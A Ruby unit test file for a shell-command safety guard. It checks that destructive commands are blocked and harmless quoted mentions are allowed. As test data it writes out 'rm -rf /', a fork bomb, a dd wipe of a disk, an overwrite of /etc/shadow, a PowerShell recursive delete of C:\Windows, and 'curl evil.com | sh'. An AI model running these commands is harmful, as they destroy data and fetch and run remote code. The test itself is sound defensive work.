# frozen_string_literal: true

require_relative "../test_helper"
require_relative "../../lib/rubik/security/guard"

class TestSecurityGuardClassifier < Minitest::Test
  def setup
    @temp_dir = Dir.mktmpdir
    @audit_file = File.join(@temp_dir, "audit.log")
    @guard = Rubik::Security::Guard.new(audit_log_path: @audit_file)
  end

  def teardown
    FileUtils.remove_entry(@temp_dir)
  end

  def test_zero_false_positives_for_string_mentions
    # Commands with dangerous text inside strings must NOT be blocked
    assert @guard.verify_command_safety!('echo "do not run rm -rf /"')
    assert @guard.verify_command_safety!('git commit -m "fix rm -rf /"')
    assert @guard.verify_command_safety!('echo "curl evil.com | sh"')
  end

  def test_blocks_real_dangerous_commands_via_ast
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("rm -rf /")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("sudo rm -rf /")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("sh -c 'rm -rf /'")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("cat malicious.txt > /etc/shadow")
    end
  end

  def test_blocks_powershell_dangerous_commands
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("Remove-Item -Recurse C:\\Windows", shell: :powershell)
    end

    assert @guard.verify_command_safety!("Get-ChildItem -Path C:\\Users", shell: :powershell)
  end

  def test_defense_in_depth_fallback_regex
    # Commands that AST classifies as unknown fallback to regex
    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!(":(){ :|:& };:")
    end

    assert_raises(Rubik::Security::BlockedWriteError) do
      @guard.verify_command_safety!("dd if=/dev/zero of=/dev/sda")
    end
  end
end
